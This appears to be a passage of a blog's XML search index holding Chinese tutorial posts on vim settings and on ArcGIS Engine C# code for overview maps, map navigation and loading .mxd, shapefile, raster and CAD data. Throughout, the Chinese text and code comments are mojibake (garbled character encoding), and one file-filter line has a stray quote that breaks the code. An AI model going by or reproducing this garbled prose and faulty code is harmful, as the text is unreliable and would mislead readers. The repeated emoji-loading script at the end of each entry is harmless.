vimçš„é…ç½®æ–‡ä»¶~/.vimrc(å®éªŒæ¥¼ç¯å¢ƒä¸­é…ç½®æ–‡ä»¶åœ¨/etc/vim/vimrc)ï¼Œå¯ä»¥æ‰“å¼€æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œä¸è¿‡åŠ¡å¿…å°å¿ƒä¸è¦å½±å“vimæ­£å¸¸ä½¿ç”¨ 2.7.2 è·å–ç›®å‰çš„è®¾å®š å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:setæˆ–è€…:seæ˜¾ç¤ºæ‰€æœ‰ä¿®æ”¹è¿‡çš„é…ç½® å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:set all æ˜¾ç¤ºæ‰€æœ‰çš„è®¾å®šå€¼ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:set option? æ˜¾ç¤ºoptionçš„è®¾å®šå€¼ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:set nooption å–æ¶ˆå½“å‰è®¾å®šå€¼ 2.7.3 setåŠŸèƒ½çš„è¯´æ˜ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:set autoindent(ai) è®¾ç½®è‡ªåŠ¨ç¼©è¿› å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:set autowrite(aw) è®¾ç½®è‡ªåŠ¨å­˜æ¡£ï¼Œé»˜è®¤æœªæ‰“å¼€ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:set background=darkæˆ–lightï¼Œè®¾ç½®èƒŒæ™¯é£æ ¼ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:set backup(bk) è®¾ç½®è‡ªåŠ¨å¤‡ä»½ï¼Œé»˜è®¤æœªæ‰“å¼€ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥: set cindent(cin) è®¾ç½®Cè¯­è¨€é£æ ¼ç¼©è¿› æ›´å¤šè¯¦ç»†å‚æ•°è¯·å‚è€ƒvimæ‰‹å†Œ ctrl + f # å‘åç¿»ä¸€é¡µ ctrl + b # å‘å‰ç¿»ä¸€é¡µ ZZ # ä¿å­˜ä¿®æ”¹å¹¶ä¸”é€€å‡º D # åˆ é™¤å…‰æ ‡åˆ°è¡Œå°¾å†…å®¹ /å­—ç¬¦ä¸² # å‘å‰æœç´¢å…³é”®å­— ?name # å‘åæœç´¢å…³é”®å­— :149,$s/iii/xxx/gc # æ›¿æ¢æŒ‡å®šè¡Œçš„iiiä¸ºxxx, å…¨å±€æ›¿æ¢,cæ˜¯ç¡®è®¤æç¤º :150 # è·³åˆ°150è¡Œ e a.txt # æ‰“å¼€å¹¶ç¼–è¾‘æŒ‡å®šæ–‡ä»¶ :n # ç¼–è¾‘ä¸‹ä¸€ä¸ªæ–‡ä»¶ :f # æ˜¾ç¤ºå½“å‰çš„æ–‡ä»¶å document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcgisEngineé¹°çœ¼åŠŸèƒ½]]></title>
    <url>%2Fposts%2Fbebe3b26%2F</url>
    <content type="text"><![CDATA[// é¹°çœ¼è§†å›¾åŠŸèƒ½ ... // OnMapReplacedå½“mapcontrol1ä¸­çš„åœ°å›¾è¢«æ›¿æ¢æ—¶ï¼Œè¯¥æ–¹æ³•è‡ªåŠ¨åŠ è½½ä¸»ç©ºé—´ä¸­æ‰€æœ‰çš„å›¾å±‚å¯¹è±¡åˆ°é¹°çœ¼ private void mainMapControl_OnMapReplaced(object sender, IMapControlEvents2_OnMapReplacedEvent e) { if (mainMapControl.Map.LayerCount > 0) { for (int i = 0; i < mainMapControl.Map.LayerCount; i++) { // åŠ è½½ eyeMapControl.AddLayer(mainMapControl.get_Layer(i)); } // é¹°çœ¼è§†å›¾çš„èŒƒå›´ç­‰äºmainMapå½“å‰çš„èŒƒå›´ eyeMapControl.Extent = mainMapControl.Extent; eyeMapControl.ActiveView.Refresh(); } } //é¹°çœ¼åŠŸèƒ½ èŒƒå›´æ›´æ–° // //--2ã€åœ¨ä¸»æ§ä»¶ä¸­ä½¿ç”¨é¼ æ ‡æ‹–æ‹½è§†å›¾çš„æ—¶å€™ï¼Œé¹°çœ¼æ§ä»¶ä¸­å‡ºç°çº¢è‰²çŸ©å½¢æ¡† //--2ã€è¯¥æ–¹æ³•å‘ç”Ÿåœ¨ä¸»è§†å›¾çš„èŒƒå›´å‘ç”Ÿå˜æ¢åï¼Œ private void mainMapControl_OnExtentUpdated(object sender, IMapControlEvents2_OnExtentUpdatedEvent e) { IEnvelope pEnvelope = (IEnvelope)e.newEnvelope; IGraphicsContainer pGraphicsContainer = eyeMapControl.Map as IGraphicsContainer; IActiveView pActiveView = pGraphicsContainer as IActiveView; pGraphicsContainer.DeleteAllElements(); IRectangleElement pRectangleEle = new RectangleElementClass(); IElement pElement = pRectangleEle as IElement; pElement.Geometry = pEnvelope; IRgbColor pColor = new RgbColorClass(); pColor.Red = 255; pColor.Green = 0; pColor.Blue = 0; pColor.Transparency = 255; ILineSymbol pOutline = new SimpleLineSymbolClass(); pOutline.Width = 3; pOutline.Color = pColor; pColor = new RgbColorClass(); pColor.Red = 255; pColor.Green = 0; pColor.Blue = 0; pColor.Transparency = 0; IFillSymbol pFillSymbol = new SimpleFillSymbolClass(); pFillSymbol.Color = pColor; pFillSymbol.Outline = pOutline; IFillShapeElement pFillShapeEle = pElement as IFillShapeElement; pFillShapeEle.Symbol = pFillSymbol; pGraphicsContainer.AddElement((IElement)pFillShapeEle, 0); pActiveView.PartialRefresh(esriViewDrawPhase.esriViewGraphics, null, null); } // é¹°çœ¼è§†å›¾åŠŸèƒ½ é¹°çœ¼è§†å›¾ç‚¹å‡»=ã€‹ä¸»å›¾èŒƒå›´è·Ÿç€å˜åŒ– private void eyeMapControl_OnMouseDown(object sender, IMapControlEvents2_OnMouseDownEvent e) { // å¦‚æœè¢«ç‚¹å‡» if (e.button == 1) { IPoint point = new ESRI.ArcGIS.Geometry.Point(); //è·å–ç‚¹å‡»é¹°çœ¼è§†å›¾çš„ç‚¹å‡»çš„ä½ç½® point.PutCoords(e.mapX, e.mapY); // ä¸»å›¾çš„ä¸­å¿ƒä½äºç‚¹å‡»çš„ç‚¹pointä¸Š mainMapControl.CenterAt(point); mainMapControl.ActiveView.Refresh(); } // å¦‚æœæ˜¯å³é”® else if (e.button == 2) { IEnvelope pEnv = eyeMapControl.TrackRectangle(); mainMapControl.Extent = pEnv; mainMapControl.ActiveView.Refresh(); } } private void eyeMapControl_OnMouseMove(object sender, IMapControlEvents2_OnMouseMoveEvent e) { if (e.button == 1) { IPoint pPoint = new PointClass(); pPoint.PutCoords(e.mapX, e.mapY); mainMapControl.CenterAt(pPoint); mainMapControl.ActiveView.Refresh(); } } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcgisEngineå®ç°åœ°å›¾æµè§ˆ]]></title>
    <url>%2Fposts%2F1a728c4f%2F</url>
    <content type="text"><![CDATA[å…¨å›¾ private void FullExtentTSButton_Click(object sender, EventArgs e) { mainMapControl.Extent = mainMapControl.FullExtent; } ç­‰æ¯”ä¾‹æ”¾å¤§ private void btnZoomInStep_Click(object sender, EventArgs e) { IEnvelope pEnvelope; pEnvelope = mainMapControl.Extent; pEnvelope.Expand(0.5, 0.5, true); //æ”¾å¤§2å€ mainMapControl.Extent = pEnvelope; mainMapControl.ActiveView.Refresh(); } ç­‰æ¯”ä¾‹ç¼©å° private void btnZoomIOutStep_Click(object sender, EventArgs e) { IActiveView pActiveView = mainMapControl.ActiveView; IPoint centerPoint = new PointClass(); centerPoint.PutCoords((pActiveView.Extent.XMin + pActiveView.Extent.XMax) / 2, (pActiveView.Extent.YMax + pActiveView.Extent.YMin) / 2); IEnvelope envlop = pActiveView.Extent; envlop.Expand(1.5, 1.5, true); //ä¸æ”¾å¤§çš„åŒºåˆ«åœ¨äºExpandçš„å‚æ•°ä¸åŒ pActiveView.Extent.CenterAt(centerPoint); pActiveView.Extent = envlop; pActiveView.Refresh(); //å¦‚æœè§‰å¾—ä¹±çš„è¯ï¼Œç›´æ¥ä¿®æ”¹æ”¾å¤§çš„å‚æ•°ä¹Ÿå°†å°±å¯ä»¥ éä¸‡ä¸å¾—å·²ä¸ç”¨ //IEnvelope pEnvelope; //pEnvelope = mainMapControl.Extent; //pEnvelope.Expand(1.5, 1.5, true); //æ”¾å¤§2å€ //mainMapControl.Extent = pEnvelope; //mainMapControl.ActiveView.Refresh(); } ä¸Šä¸€è§†å›¾ // å®šä¹‰å…¨å±€å˜é‡ IExtentStack pExtentStack; private void PreViewTSButton_Click(object sender, EventArgs e) { pExtentStack = mainMapControl.ActiveView.ExtentStack; //åˆ¤æ–­æ˜¯å¦å¯ä»¥å›åˆ°å‰ä¸€è§†å›¾ï¼Œç¬¬ä¸€ä¸ªè§†å›¾æ²¡æœ‰å‰è§†å›¾ if (pExtentStack.CanUndo()) { pExtentStack.Undo(); //æ’¤é”€åˆ°ä¸Šä¸€è§†å›¾èŒƒå›´ NextViewTSButton.Enabled = true; //åä¸€è§†å›¾å¯ä»¥ä½¿ç”¨ if (!pExtentStack.CanUndo()) { PreViewTSButton.Enabled = false; //å‰ä¸€è§†å›¾ä¸èƒ½ä½¿ç”¨ } } mainMapControl.ActiveView.Refresh(); } ä¸‹ä¸€è§†å›¾ private void NextViewTSButton_Click(object sender, EventArgs e) { pExtentStack = mainMapControl.ActiveView.ExtentStack; //åˆ¤æ–­æ˜¯å¦å¯ä»¥å›åˆ°åä¸€è§†å›¾ï¼Œæœ€åä¸€ä¸ªè§†å›¾æ²¡æœ‰åä¸€è§†å›¾ if (pExtentStack.CanRedo()) //å¦‚æœå¯ä»¥é‡åšä¸‹ä¸€è§†å›¾ { pExtentStack.Redo(); //é‡åšåˆ°ä¸‹ä¸€è§†å›¾ PreViewTSButton.Enabled = true; //ä¸Šä¸€è§†å›¾æŒ‰é’®å¯ä»¥ä½¿ç”¨ if (!pExtentStack.CanRedo()) //å¦‚æœä¸å¯ä»¥é‡åšä¸‹ä¸€è§†å›¾ { NextViewTSButton.Enabled = false; //ä¸‹ä¸€è§†å›¾ä¸èƒ½ç”¨ } } mainMapControl.ActiveView.Refresh(); } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngineåˆè¯† -- æ‰“å¼€åœ°å›¾]]></title>
    <url>%2Fposts%2F210c46ef%2F</url>
    <content type="text"><![CDATA[ä¸€å¥ä»£ç  åˆ›å»ºwinformç¨‹åº å¿…é¡»è¦æ·»åŠ LicenseControlæ§ä»¶ TOCControlè§†å›¾æ§ä»¶ =&gt; å±æ€§,è®¾ç½®å…³è”å±æ€§ç»‘å®š(Buddy)åˆ°åœ°å›¾æ§ä»¶ä¸Š ToolbalControlå·¥å…·æ¡æ§ä»¶ ä¼™ä¼´æ§ä»· =&gt; è®¾ç½®å…³è”å±æ€§ç»‘å®šåˆ°åœ°å›¾æ§ä»¶ä¸Š MapControlåœ°å›¾æ§ä»¶ ä¹Ÿå¯ä»¥è®¾ç½®å±æ€§è®¾ç½®é»˜è®¤æ‰“å¼€çš„åœ°å›¾ å¼•ç”¨ESRI.ArcGIS.Version åœ¨ä¸»ç¨‹åºä»£ç ä¸­åŠ å…¥ï¼š//åœ¨çª—å£åŠ è½½å‰æ·»åŠ  ç»‘å®šäº§å“ç  // æ³¨æ„æ˜¯ program.csæ–‡ä»¶ ESRI.ArcGIS.RuntimeManager.Bind(ESRI.ArcGIS.ProductCode.EngineOrDesktop); æ‰èƒ½æ­£å¸¸è¿è¡Œ å¸¸è§çš„AEæ§ä»· PageLayoutControl å¸ƒå±€è§†å›¾ TOOControl å†…å®¹åˆ—è¡¨ MapControl æ•°æ®è§†å›¾ æ‰“å¼€åœ°å›¾æ–‡æ¡£F1 è‡ªå·±å†™çš„//æ‰“å¼€mxdæ–‡æ¡£ F1 try { //å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ OpenFileDialog open = new OpenFileDialog(); //è®¾ç½®å‚æ•° //æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ open.CheckFileExists = true; open.Title = "æ‰“å¼€åœ°å›¾æ–‡æ¡£"; // ä¸å…è®¸å¤šä¸ªæ–‡ä»¶åŒæ—¶æ‰“å¼€ open.Multiselect = false; // å­˜å‚¨æ—¶æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„ open.RestoreDirectory = true; //æ‰“å¼€æ–‡ä»¶æ ¼å¼ open.Filter = "åœ°å›¾æ–‡æ¡£(*.mxd)|*.mxd;|ArcMapæ¨¡æ¿(*.mxt)|*.mxt";|æ‰€æœ‰åœ°å›¾æ ¼å¼(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf"/æ–‡ä»¶è¿‡æ»¤æ¡ä»¶ open.Multiselect = false;//ç¦æ­¢å¤šé€‰ open.RestoreDirectory = true; // å­˜å‚¨æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„ //åˆ¤æ–­å¦‚æœæ–‡ä»¶æ­£å¸¸æ‰“å¼€ if (open.ShowDialog() == DialogResult.OK) { // è·å–æ–‡ä»¶è·¯å¾„ path+name string fileName = open.FileName; // æ•°æ®çª—å£åŠ è½½åœ°å›¾æ–‡æ¡£ axMapControl1.LoadMxFile(fileName); // åˆ·æ–°ä¸€ä¸‹é¡µé¢ axMapControl1.ActiveView.Refresh(); // ä¼™ä¼´æ§ä»¶å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼æ¥è¿›è¡Œç»‘å®š axTOCControl1.SetBuddyControl(axMapControl1); } } catch(Exception) { MessageBox.Show("è¯·æ‰“å¼€æ­£ç¡®çš„æ–‡æ¡£!", "æé†’", MessageBoxButtons.OK, MessageBoxIcon.Information); } } F2 ä½¿ç”¨IMapControlæ¥å£çš„LoadMxFileæ–¹æ³• OpenFileDialog open = new OpenFileDialog(); //è®¾ç½®å‚æ•° //æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ open.CheckFileExists = true; open.Title = "æ‰“å¼€åœ°å›¾æ–‡æ¡£"; // ä¸å…è®¸å¤šä¸ªæ–‡ä»¶åŒæ—¶æ‰“å¼€ open.Multiselect = false; // å­˜å‚¨æ—¶æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„ open.RestoreDirectory = true; //æ‰“å¼€æ–‡ä»¶æ ¼å¼ open.Filter = "åœ°å›¾æ–‡æ¡£(*.mxd)|*.mxd;|ArcMapæ¨¡æ¿(*.mxt)|*.mxt;|æ‰€æœ‰åœ°å›¾æ ¼å¼(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf";//æ–‡ä»¶è¿‡æ»¤æ¡ä»¶ open.Multiselect = false;//ç¦æ­¢å¤šé€‰ open.RestoreDirectory = true; // å­˜å‚¨æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„ open.ShowDialog(); //æ–‡ä»¶å string fileName = open.FileName; if (fileName == "") { return; } //æ£€æŸ¥åœ°å›¾æ–‡æ¡£æœ‰æ•ˆæ€§ if (mainMapControl.CheckMxFile(fileName)) { mainMapControl.LoadMxFile(fileName); mainMapControl.ActiveView.Refresh(); } else { MessageBox.Show(fileName + "æ˜¯æ— æ•ˆçš„åœ°å›¾æ–‡æ¡£!", "ä¿¡æ¯æç¤º"); return; } F3 ä½¿ç”¨IMapDocumentæ¥å£// using ESRI.ArcGIS.Carto; OpenFileDialog open = new OpenFileDialog(); //è®¾ç½®å‚æ•° //æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ open.CheckFileExists = true; open.Title = "æ‰“å¼€åœ°å›¾æ–‡æ¡£"; // ä¸å…è®¸å¤šä¸ªæ–‡ä»¶åŒæ—¶æ‰“å¼€ open.Multiselect = false; // å­˜å‚¨æ—¶æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„ open.RestoreDirectory = true; //æ‰“å¼€æ–‡ä»¶æ ¼å¼ open.Filter = @"åœ°å›¾æ–‡æ¡£(*.mxd)|*.mxd;|ArcMapæ¨¡æ¿(*.mxt)|*.mxt;|æ‰€æœ‰åœ°å›¾æ ¼å¼(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf";//æ–‡ä»¶è¿‡æ»¤æ¡ä»¶ open.Multiselect = false;//ç¦æ­¢å¤šé€‰ open.RestoreDirectory = true; //æ‰“å¼€çª—å£ open.ShowDialog(); // å­˜å‚¨æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„ string fileName = open.FileName; if (mainMapControl.CheckMxFile(fileName)) { //å°†æ•°æ®è½½å…¥pMapDocumentå¹¶ä¸Mapæ§ä»¶å…³è” IMapDocument pMapDocument = new MapDocument(); // using ESRI.ArcGIS.Carto; pMapDocument.Open(fileName, ""); //è·å–Mapåœ°å›¾ä¸­æ¿€æ´»çš„åœ°å›¾æ–‡æ¡£ mainMapControl.Map = pMapDocument.ActiveView.FocusMap; mainMapControl.ActiveView.Refresh(); } F4 ä½¿ç”¨ControlsOpenDocCommandClassç±»åº“èµ„æº =ã€‹ é€‚åˆæ¯”èµ›ç”¨//using ESRI.ArcGIS.Controls; ICommand command = new ControlsOpenDocCommandClass(); //using ESRI.ArcGIS.Controls; command.OnCreate(mainMapControl.Object); command.OnClick(); mainTOCControl.SetBuddyControl(mainMapControl); å¾…æ”¹è¿›ä¹‹å¤„ï¼š çª—å£çš„å¤§å°ä»¥åŠå‡ºç°çš„ä½ç½®ï¼Œç¾åŒ– Formçš„nameéšç€æ–‡æ¡£çš„åå­—æ”¹å˜ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngineåŠ è½½æ•°æ®]]></title>
    <url>%2Fposts%2F980b1709%2F</url>
    <content type="text"><![CDATA[åŠ è½½shapefileæ•°æ®F1 ä½¿ç”¨AddShapefileæ–¹æ³• private void æ·»åŠ ShapefileToolStripMenuItem_Click(object sender, EventArgs e) { try { //åŒæ ·å®ä¾‹åŒ–ä¸€ä¸ªæ‰“å¼€æ–‡ä»¶çš„ç±»å¯¹è±¡ OpenFileDialog open = new OpenFileDialog(); // å¦‚æœæ‰“å¼€æ­£ç¡® if (open.ShowDialog() == DialogResult.OK) { //é¦–å…ˆå®šä¹‰ä¸€ä¸ªç©ºçš„è·¯å¾„ string filePath = string.Empty; // ç„¶åå®šä¹‰ä¸€ä¸ªç©ºçš„æ–‡ä»¶å string file = string.Empty; // è·å–å®Œæ•´çš„æ–‡ä»¶è·¯å¾„ string filedir = open.FileName; //å¦‚æœè·¯å¾„ä¸ºç©ºï¼Œå˜›éƒ½ä¸è¿”å› if (fileDir == "") return; // å¯¹å®Œæ•´è·¯å¾„è¿›è¡Œæˆªå– è·å–æœ€åä¸€ä¸ªæ–œæ çš„ç´¢å¼• int pos = filedir.LastIndexOf('\\'); // æˆªå–å­—ç¬¦ä¸² è·¯å¾„ filePath =filedir.Substring(0, pos); //æ–‡ä»¶å file = filedir.Substring(pos+1); // éœ€è¦ä¸¤ä¸ªå‚æ•° axMapControl1.AddShapeFile(filePath, file); //åˆ·æ–° axMapControl1.ActiveView.Refresh(); } } catch (Exception) { MessageBox.Show("è¯·æ‰“å¼€æ­£ç¡®çš„æ–‡æ¡£!", "æé†’",MessageBoxButtons.OK, MessageBoxIcon.Error ); } } F2 ä½¿ç”¨å·¥ä½œç©ºé—´æ€è·¯: åˆ›å»ºShapefileWorkspaceFactoryå®ä¾‹ï¼Œä½¿ç”¨OpenFromFileæ–¹æ³•æ‰“å¼€å·¥ä½œåŒºã€‚ åˆ›å»ºFeatureLayerçš„å®ä¾‹ï¼Œå®šä¹‰æ•°æ®é›†ã€‚ ä½¿ç”¨AddLayeræ–¹æ³•åŠ è½½æ•°æ®ã€‚ using ESRI.ArcGIS.Geodatabase; using ESRI.ArcGIS.DataSourcesFile; using ESRI.ArcGIS.DataSourcesRaster; OpenFileDialog open = new OpenFileDialog(); open.CheckFileExists = true; open.Title = "æ‰“å¼€Shapeæ–‡ä»¶"; open.RestoreDirectory = true; open.Filter = "Shapeæ–‡ä»¶(*.shp)|**.shp"; open.RestoreDirectory = true; open.ShowDialog(); //è·å–å®Œæ•´çš„æ–‡ä»¶è·¯å¾„ :path+name string fileDir = open.FileName; //è·¯å¾„ä¸ºç©ºä¸è¿”å› if (fileDir == "") return; // å¯¹å®Œæ•´è·¯å¾„è¿›è¡Œæˆªå– int pos = fileDir.LastIndexOf("\\"); // è·¯å¾„ string pfilePath = fileDir.Substring(0, pos); //æ–‡ä»¶å string file = fileDir.Substring(pos + 1); //å®ä¾‹åŒ–ShapefileWorkspaceFactoryå·¥ä½œç©ºé—´ï¼Œæ‰“å¼€Shapeæ–‡ä»¶ IWorkspaceFactory pWsFactory = new ShapefileWorkspaceFactoryClass(); //å¼ºåˆ¶è½¬æ¢ æ‰“å¼€è·¯å¾„ IFeatureWorkspace pWorkSpace = pWsFactory.OpenFromFile(pfilePath, 0) as IFeatureWorkspace; //åˆ›å»ºå¹¶å®ä¾‹åŒ–è¦ç´ ç±» IFeatureClass pFeatureClass = pWorkSpace.OpenFeatureClass(file); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); åŠ è½½æ …æ ¼æ•°æ®ä¸»è¦ç”¨åˆ°ä»¥ä¸‹2ä¸ªæ¥å£ï¼š IRasterPyramid3æ¥å£æä¾›å¯¹æ …æ ¼æ•°æ®é›†çš„é‡‘å­—å¡”å±æ€§çš„è®¿é—® Presentå±æ€§â€“åˆ¤æ–­æ …æ ¼æ•°æ®é›†æ˜¯å¦å­˜åœ¨é‡‘å­—å¡” Createæ–¹æ³•â€“ä¸ºæ …æ ¼æ•°æ®é›†åˆ›å»ºé‡‘å­—å¡” IRasterLayeræ¥å£ç»§æ‰¿è‡ªILayeræ¥å£ CreateFromDatasetæ–¹æ³•â€“ä»å·²æœ‰çš„æ …æ ¼æ•°æ®é›†å¯¹è±¡åˆ›å»ºå›¾å±‚ CreateFromRasteræ–¹æ³•â€“ä»å·²æœ‰çš„æ …æ ¼å¯¹è±¡åˆ›å»ºå›¾å±‚ Rasterå±æ€§â€“è·å–IRasterLayeræ¥å£ä¸­çš„Rasterå¯¹è±¡ DisplayResolutionFactorå±æ€§â€“è®¾ç½®æ …æ ¼æ•°æ®çš„åˆ†è¾¨ç‡ 1.ç›´æ¥ç”¨IRasterLayeræ¥å£æ‰“å¼€ä¸€ä¸ªæ …æ ¼æ–‡ä»¶å¹¶åŠ è½½åˆ°åœ°å›¾æ§ä»¶ IRasterLayer rasterLayer = new RasterLayerClass(); rasterLayer.CreateFromFilePath(fileName); // fileNameæŒ‡å­˜æœ¬åœ°çš„æ …æ ¼æ–‡ä»¶è·¯å¾„ axMapControl1.AddLayer(rasterLayer, 0); 2.æ€è·¯: (1)ä½¿ç”¨OpenFromFileæ–¹æ³•è·å¾—æ …æ ¼æ–‡ä»¶çš„å·¥ä½œåŒº (2)ä½¿ç”¨OpenRasterDatasetæ–¹æ³•è·å¾—æ …æ ¼æ–‡ä»¶çš„æ•°æ®é›† (3)åˆ¤æ–­æ …æ ¼æ•°æ®é›†æ˜¯å¦å…·æœ‰é‡‘å­—å¡” (4)åˆ›å»ºpRasterLayerï¼Œå¹¶å®šä¹‰æ•°æ®é›† (5)ä½¿ç”¨AddLayeræ–¹æ³•åŠ è½½æ•°æ®` OpenFileDialog pOpenFileDialog = new OpenFileDialog(); pOpenFileDialog.CheckFileExists = true; pOpenFileDialog.Title = "åŠ è½½æ …æ ¼æ•°æ®"; pOpenFileDialog.Filter = "æ …æ ¼æ–‡ä»¶(*.*)|*.bmp;*.tif;*.jpg;*.img;|BMP(*.bmp)|*.bmp;|TIF(*.tif)|*.tif;|JPG(*.jpg)|*.jpg;|IMG(*.img)|*.img"; pOpenFileDialog.ShowDialog(); //è·å–åå­— string pRasterFilename = pOpenFileDialog.FileName; if (pRasterFilename == "") return; // IOé‡Œé¢è·å–æ–‡ä»¶åå­—ä¸è·¯å¾„çš„å›ºå®šç”¨æ³• string pPath = System.IO.Path.GetDirectoryName(pRasterFilename); string pFileName = System.IO.Path.GetFileName(pRasterFilename); IWorkspaceFactory pWorkspaceFactory = new RasterWorkspaceFactory(); IWorkspace pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0); IRasterWorkspace pRasterWorkspace = pWorkspace as IRasterWorkspace; IRasterDataset pRasterDataset = pRasterWorkspace.OpenRasterDataset(pFileName); //å½±åƒé‡‘å­—å¡”çš„åˆ¤æ–­ä¸åˆ›å»º IRasterPyramid3 pRasPyramid; pRasPyramid = pRasterDataset as IRasterPyramid3; if (pRasPyramid != null) { if (!(pRasPyramid.Present)) { //åˆ›å»ºé‡‘å­—å¡” pRasPyramid.Create(); } } IRaster pRaster; pRaster = pRasterDataset.CreateDefaultRaster(); IRasterLayer pRasterLayer; pRasterLayer = new RasterLayerClass(); pRasterLayer.CreateFromRaster(pRaster); ILayer pLayer = pRasterLayer as ILayer; mainMapControl.AddLayer(pLayer, 0); ### åŠ è½½CADæ•°æ® ###### 1.ä½œä¸ºçŸ¢é‡å›¾å±‚åŠ è½½ === 1)åˆ†å›¾å±‚åŠ è½½ IWorkspaceFactory pWorkspaceFactory; IFeatureWorkspace pFeatureWorkspace; pWorkspaceFactory = new CadWorkspaceFactory(); pFeatureWorkspace = (IFeatureWorkspace)pWorkspaceFactory.OpenFromFile(pPath, 0); //åŠ è½½CADæ–‡ä»¶ä¸­çš„çº¿æ–‡ä»¶ IFeatureClass pFeatureClass = pFeatureWorkspace.OpenFeatureClass(pFileName + ":polyline"); IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFileName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); ###### 2.ä½œä¸ºçŸ¢é‡å›¾å±‚åŠ è½½ === 1)æ•´å¹…å›¾åŠ è½½ //æ‰“å¼€CADæ•°æ®é›† IWorkspaceFactory pWorkspaceFactory = new CadWorkspaceFactoryClass(); //using ESRI.ArcGIS.DataSourcesFile; IFeatureWorkspace pFeatureWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0) as IFeatureWorkspace; //æ‰“å¼€ä¸€ä¸ªè¦ç´ é›† IFeatureDataset pFeatureDataset = pFeatureWorkspace.OpenFeatureDataset(pFileName); // IFeatureContainerå¯ä»¥ç®¡ç†IFeatureDatasetä¸­çš„æ¯ä¸ªè¦ç´ ç±» IFeatureClassContainer pFeatureContainer = (IFeatureClassContainer)pFeatureDataset; //å¯¹CADæ–‡ä»¶ä¸­çš„è¦ç´ è¿›è¡Œéå†å¤„ç† for (int i = 0; i &lt; pFeatureContainer.ClassCount; i++) { IFeatureClass pFeatureClass = pFeatureContainer.get_Class(i); //å¦‚æœæ˜¯æ³¨è®°ï¼Œ åˆ™æ·»åŠ æ³¨è®°å±‚ if (pFeatureClass.FeatureType == esriFeatureType.esriFTCoverageAnnotation) { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } else //å¦‚æœæ˜¯ç‚¹çº¿é¢åˆ™æ·»åŠ è¦ç´ å±‚ { IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); } mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl); } 